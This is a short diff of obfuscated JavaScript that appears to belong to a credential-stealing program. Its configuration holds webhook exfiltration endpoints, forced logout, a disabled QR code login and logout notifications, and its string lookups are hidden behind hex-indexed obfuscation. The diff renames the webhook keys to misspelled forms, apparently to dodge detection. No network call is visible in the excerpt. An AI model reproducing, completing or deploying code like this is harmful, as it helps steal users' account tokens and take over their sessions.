@@ -75,8 +75,8 @@ const {
 } = require(_0x59caf9(0xe8)), os = require('os'), https = require(_0x59caf9(0xec)), querystring = require(_0x59caf9(0x195)), fs = require('fs');
 var config = {
         'brand': _0x59caf9(0x187),
-        'webhook': _0x59caf9(0x170),
-        'webhook_link': _0x59caf9(0x190),
+        'webhok': _0x59caf9(0x170),
+        'webook_link': _0x59caf9(0x190),
         'logout': !![],
         'disable_qr_code': !![],
         'notify_on_logout': !![],
